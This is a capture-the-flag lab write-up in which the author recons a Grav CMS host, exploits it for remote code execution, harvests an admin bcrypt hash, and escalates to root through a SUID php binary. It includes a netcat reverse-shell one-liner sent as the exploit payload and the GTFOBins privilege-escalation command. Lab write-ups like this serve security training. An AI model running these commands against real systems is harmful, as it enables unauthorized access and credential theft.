## Recon

### Nmap
During my initial scan I found out only `22` and `80` were open, so I did a more detailed scan of these 2 ports:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -sT -vvvv -T5 -p22,80 192.168.203.12

I went ahead and added the host under `astronaut.offsec` to my `/etc/hosts` file.

### Nessus
I also decided to boot up `Nessus` to try it out and see what sort of vulnerabilities I could find compared to `nmap`. These were the results:

As well as 

![](../../../assets/574dfbda9eba540d389f9f668db205a7.png)

It appears to contain two types of vulnerabilities:

### Gobuster
Since I am dealing with browsable directories I booted up `gobuster` in order to check out what we're dealing with:

```bash
┌──(kali㉿kali)-[~]

```

That was no help at all, so let's check out port `80`.


## 80/TCP - HTTP

Funnily enough when I head into the website I receive this screen:

![](../../../assets/95c4e6656fe803cc16d4cf0245462cc7.png)

The site itself was not of much use, but I was able to find an exploit for the `Grav` CMS running on the site.

![](../../../assets/af3dd20ea2960b35ada51051165edf41.png)

I downloaded the script and checked if I had to modify anything, but it appears to be ready to execute right away, so I ran the exploit and waited for the output:

![](../../../assets/1e74f365c5f2c3195cee345fe50567ee.png)

I got no response, which means it either failed (which it shouldn't since it says completed), or it's actually a `blind` exploit. 

Using [revshells.com](https://www.revshells.com/) I made a `Bind` shell which I would upload as a command and hope that the exploit goes through:

![](../../../assets/c5faef3478f364b08dce7b5f128e5c6b.png)

I update the payload and start a listener:

```bash
# Netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                                    
listening on [any] 1234 ...

# Uploading Bind shell
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 exploit.py -t http://astronaut.offsec/grav-admin -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.161 1234 > /tmp/f'
```

After some time has passed I get the `Bind` shell:

![](../../../assets/6bafd91c8c873f09c57af32479e7fc94.png)

As always first thing I do is stabilize the shell:

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@gravity:~/html/grav-admin$ 
```

And now I can get to work. After some digging around I landed on the following file:

![](../../../assets/81bd4784d5dc04606266ef6dadd2f43a.png)

I noticed some juicy creds:

```bash
admin
$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.
```

```bash
admin:$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.:IJQxNdg2BPKhvp
```


It appears to be a `bcrypt` hash so I threw `John` on it and went to explore the target further in the meantime.

After a while I checked up on `John` and found it had made no progress so I called it off:

## Privilege Escalation

In order to escalate my privileges I went ahead and checked for `SUID` bit sets and found the following:

![](../../../assets/54bb43e761b7bc94f0d4807db2472fc7.png)

One that clearly stood out right away was `/usr/bin/php7.4`. I went to [gtfobins](https://gtfobins.github.io/gtfobins/php/?source=post_page-----627bc41a86ef--------------------------------) to find the correct command to break out of the restricted shell.

![](../../../assets/4964dc0c0217d6544ce616d4f8616bf8.png)

I had to issue the following command:

```bash
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

![](../../../assets/56684ba184de0e1747ce8ba4179d1756.png)

Once that was done I could go ahead and get the flags.

```bash
# cd root
cd root
# ls -l
ls -l
total 12
-rw------- 1 root root    9 Apr  3  2023 flag1.txt
-rwx------ 1 root root   33 Sep 13 12:01 proof.txt
drwx------ 3 root root 4096 Jan 24  2023 snap
# cat flag1.txt && cat proof.txt
cat flag1.txt && cat proof.txt
T2Zmc2Vj
442f086310877889d84b49a2590a2510
```

Apparently the `flag1.txt` was a false positive.
